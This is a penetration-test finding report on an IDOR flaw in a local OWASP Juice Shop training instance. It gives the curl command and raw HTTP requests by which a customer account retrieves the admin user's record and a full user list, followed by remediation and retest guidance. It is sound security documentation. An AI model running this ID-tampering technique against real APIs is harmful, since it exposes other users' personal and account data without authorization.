# BOLA / IDOR – Unauthorized Access to User Records

## 1. Finding Summary

| Field | Details |
|---|---|
| Vulnerability | Broken Object Level Authorization (BOLA) / IDOR |
| Severity | High |
| OWASP Category | OWASP API Security – API1: Broken Object Level Authorization |
| CWE | CWE-639: Authorization Bypass Through User-Controlled Key |
| Affected Endpoint | `GET /api/Users/{id}` |
| HTTP Method | `GET` |
| Authentication Required | Yes |
| Authenticated Role | `customer` |
| Authenticated User ID | `25` |
| Tested Target Object | User ID `1` |
| Application | OWASP Juice Shop |
| Host | `127.0.0.1:3000` |
| Testing Tool | `curl` |
| Status | Confirmed |

---

## 2. Executive Summary

During authenticated API security testing, a Broken Object Level
Authorization (BOLA) vulnerability was identified in the user-management
API.

A low-privileged authenticated customer account was able to request the
record of another user by modifying the numeric object identifier in the
API request.

The authenticated test account was associated with user ID `25` and had
the `customer` role.

However, changing the requested resource from:

```text
/api/Users/25
```

to:

```text
/api/Users/1
```

resulted in a successful `200 OK` response containing information
belonging to user ID `1`.

User ID `1` was identified as an administrator account:

```text
email: admin@juice-sh.op
role: admin
```

This demonstrates that the server-side API did not adequately enforce
object-level authorization for the requested user resource.

---

## 3. Technical Description

The affected API accepts a user-controlled numeric identifier:

```http
GET /api/Users/{id}
```

The application should verify that the authenticated user is authorized
to access the requested object before returning its information.

During testing, the authenticated account was:

```text
User ID: 25
Role: customer
Email: vapt.test@example.com
```

The following request was then issued:

```http
GET /api/Users/1 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <REDACTED_JWT>
```

Despite the authenticated account being a customer with user ID `25`,
the API returned the record associated with user ID `1`.

---

# 4. Authentication Context

The testing account was created specifically for security testing.

```text
Email: vapt.test@example.com
User ID: 25
Role: customer
```

The authentication mechanism used a JWT supplied through the
`Authorization` header.

For portfolio publication, the actual JWT has been redacted:

```http
Authorization: Bearer <REDACTED_JWT>
```

> **Security Note:** The real JWT and test password must not be committed
> to the public repository.

---

# 5. Proof of Concept

## Step 1 – Establish the authenticated identity

The application issued a JWT for the test account.

The token identified the authenticated account as:

```text
User ID: 25
Role: customer
Email: vapt.test@example.com
```

The authenticated session was therefore a normal customer account rather
than an administrator account.

---

## Step 2 – Request the user collection

The following authenticated API request was tested:

```http
GET /api/Users HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <REDACTED_JWT>
```

The server returned:

```http
HTTP/1.1 200 OK
Content-Type: application/json
```

The response contained records for multiple users.

The response contained:

```text
Total users exposed: 24
```

The observed roles were:

```text
admin:       8
customer:   11
deluxe:      4
accounting:  1
```

The response also contained fields including:

```text
email
role
lastLoginIp
deluxeToken
```

---

# 6. Step 3 – Test Object-Level Authorization

The authenticated account belonged to user ID `25`.

A request targeting that account would use:

```http
GET /api/Users/25
```

The object identifier was then changed to another user:

```http
GET /api/Users/1
```

The same authenticated customer JWT was retained.

No administrator credentials were used.

---

# 7. Vulnerable Request

```http
GET /api/Users/1 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <REDACTED_JWT>
```

The request was sent using the authenticated customer account.

---

# 8. Server Response

The server returned:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
```

The response contained:

```json
{
  "status": "success",
  "data": {
    "id": 1,
    "username": "",
    "email": "admin@juice-sh.op",
    "role": "admin",
    "deluxeToken": "",
    "lastLoginIp": "",
    "profileImage": "assets/public/images/uploads/defaultAdmin.png",
    "isActive": true,
    "createdAt": "2026-09-18T15:21:41.050Z",
    "updatedAt": "2026-09-18T15:21:41.050Z",
    "deletedAt": null
  }
}
```

The important observation is:

```text
Authenticated user:
ID = 25
Role = customer

Requested object:
ID = 1
Role = admin

Server response:
HTTP 200 OK
```

---

# 9. Reproduction Using curl

The vulnerability can be reproduced with the following request:

```bash
curl -s -i \
  -H "Authorization: Bearer <REDACTED_JWT>" \
  http://127.0.0.1:3000/api/Users/1
```

Expected vulnerable result:

```text
HTTP/1.1 200 OK
```

followed by the requested user's information.

---

# 10. Evidence Collected

The following evidence files were generated during testing:

```text
enumeration/api-users-bearer-auth.txt
enumeration/api-user-1-authenticated.txt
enumeration/whoami-cookie-auth.json
```

## Evidence 1 – User Enumeration

File:

```text
enumeration/api-users-bearer-auth.txt
```

The authenticated request returned multiple user records.

Observed result:

```text
Total users exposed: 24
```

Observed roles:

```text
admin:       8
customer:   11
deluxe:      4
accounting:  1
```

The API response included fields such as:

```text
email
role
lastLoginIp
deluxeToken
```

---

## Evidence 2 – Access to User ID 1

File:

```text
enumeration/api-user-1-authenticated.txt
```

Verification:

```bash
grep -E '^HTTP/|^\{"status"' \
enumeration/api-user-1-authenticated.txt
```

Observed result:

```text
HTTP/1.1 200 OK
```

The response identified user ID `1` as:

```text
email: admin@juice-sh.op
role: admin
```

---

## Evidence 3 – Authenticated Identity

File:

```text
enumeration/whoami-cookie-auth.json
```

This evidence was used during testing to establish the authenticated
application session.

---

# 11. Authorization Boundary

The expected authorization boundary was:

```text
Customer User 25
        |
        +----> Own user object (25)
                  ALLOWED

        |
        +----> Other user object (1)
                  SHOULD BE DENIED
```

Observed behavior:

```text
Customer User 25
        |
        +----> /api/Users/25
                  Accessible

        |
        +----> /api/Users/1
                  HTTP 200 OK
                  Admin data returned
```

This indicates insufficient object-level authorization enforcement.

---

# 12. Impact

An attacker who obtains a valid low-privileged customer session could
potentially enumerate other user objects by modifying the user ID in the
API request.

The demonstrated impact includes unauthorized access to:

- User IDs
- Email addresses
- Account roles
- Profile image paths
- Account status
- Last login IP fields
- Deluxe tokens where present

The test also demonstrated that an account with the `customer` role could
retrieve an administrator user's record.

The broader impact depends on which additional API endpoints expose
similar authorization behavior.

---

# 13. Security Risk

The primary security concern is that authorization is not sufficiently
bound to the requested object.

The server appears to authenticate the requester but does not adequately
verify whether that authenticated requester is authorized to access the
specific user object identified by the supplied ID.

This creates a horizontal/vertical authorization weakness:

```text
Authenticated Customer
        |
        v
User-controlled ID
        |
        v
Another user's object
        |
        v
Sensitive information returned
```

---

# 14. Root Cause

The likely root cause is insufficient server-side object-level
authorization enforcement.

Authentication answers:

> "Who is making this request?"

Authorization must additionally answer:

> "Is this user allowed to access this specific object?"

The affected endpoint successfully authenticated the requester but did not
adequately enforce the second check.

---

# 15. Remediation

The application should implement explicit server-side authorization checks
for every user-object request.

For example:

```text
1. Validate the authentication token.
2. Identify the authenticated user.
3. Extract the requested object ID.
4. Determine whether the authenticated user is authorized to access that
   object.
5. Allow the request only when authorization succeeds.
6. Otherwise return an authorization error.
```

For a normal customer account, the application should restrict access to
the user's own record unless a specific business requirement grants
additional access.

Administrative access should be controlled using explicit server-side
authorization rules.

---

# 16. Recommended Authorization Logic

Conceptually:

```text
if authenticated_user.id == requested_user.id:
    allow
elif authenticated_user.role == "admin":
    allow according to administrative policy
else:
    deny
```

Authorization should be implemented centrally where possible rather than
relying on individual client-side controls.

---

# 17. API Response Hardening

The application should also avoid returning unnecessary sensitive
attributes.

Fields such as:

```text
lastLoginIp
deluxeToken
```

should only be returned when required by the legitimate business
function and when the requester is authorized to view them.

Sensitive information should follow the principle of least privilege.

---

# 18. Recommended HTTP Response

When a customer attempts to access another user's protected object, the
application should return an authorization failure rather than the
requested object.

For example:

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json
```

Example:

```json
{
  "error": "Forbidden"
}
```

The exact response format can vary according to the application's API
design.

---

# 19. Validation After Remediation

After implementing the fix, repeat the following test:

```http
GET /api/Users/1
Authorization: Bearer <customer JWT>
```

Expected result:

```text
Customer requesting another user's object
                |
                v
        Authorization check
                |
                v
             DENIED
```

Then verify that:

```http
GET /api/Users/25
Authorization: Bearer <customer JWT>
```

continues to provide the functionality legitimately required by the
application.

Administrative users should be tested separately according to the
application's intended authorization policy.

---

# 20. Testing Methodology

The vulnerability was tested using authenticated HTTP requests from a
Kali Linux testing environment.

Primary tool:

```text
curl
```

The testing process consisted of:

```text
1. Create/use a dedicated test account
2. Authenticate to the application
3. Obtain the JWT
4. Identify the authenticated user ID
5. Request the user API
6. Observe exposed user objects
7. Modify the object identifier
8. Request another user's object
9. Compare the response
10. Preserve the HTTP response as evidence
```

---

# 21. Burp Suite Note

Burp Suite was considered for request interception and manual
reproduction.

However, the vulnerability was successfully reproduced using `curl`,
which provides a direct and reproducible HTTP request suitable for
documenting the API behavior.

The finding does not depend on a specific testing tool.

---

# 22. False Positive Considerations

The response was not treated as a vulnerability solely because a numeric
user ID could be modified.

The finding was confirmed by comparing:

```text
Authenticated identity:
User ID 25 / customer
```

against:

```text
Requested object:
User ID 1 / admin
```

and observing:

```text
HTTP 200 OK
```

with the other user's data returned.

This establishes that the issue concerns authorization rather than
simple object enumeration alone.

---

# 23. Limitations

Testing was performed against the local OWASP Juice Shop instance:

```text
http://127.0.0.1:3000
```

The observed behavior represents the configured test environment.

The assessment did not assume that every application endpoint contains
the same authorization weakness.

Additional endpoints should be assessed independently.

---

# 24. Security Classification

```text
Category:
Broken Object Level Authorization

OWASP API Security:
API1 – Broken Object Level Authorization

CWE:
CWE-639 – Authorization Bypass Through User-Controlled Key
```

---

# 25. Final Finding

A low-privileged authenticated customer account was able to access an
administrator user's API object by modifying the user-controlled ID in:

```text
GET /api/Users/{id}
```

The tested request:

```text
GET /api/Users/1
```

returned:

```text
HTTP/1.1 200 OK
```

and disclosed information belonging to:

```text
User ID: 1
Email: admin@juice-sh.op
Role: admin
```

while the requester remained authenticated as:

```text
User ID: 25
Role: customer
```

The behavior confirms a Broken Object Level Authorization / IDOR
condition in the tested endpoint.

---

# 26. Portfolio Evidence

Relevant evidence:

```text
enumeration/
├── api-users-bearer-auth.txt
├── api-user-1-authenticated.txt
└── whoami-cookie-auth.json
```

Finding documentation:

```text
findings/
└── BOLA-IDOR-user-access.md
```

All authentication tokens, passwords, and other credentials should be
redacted before publishing the project publicly.
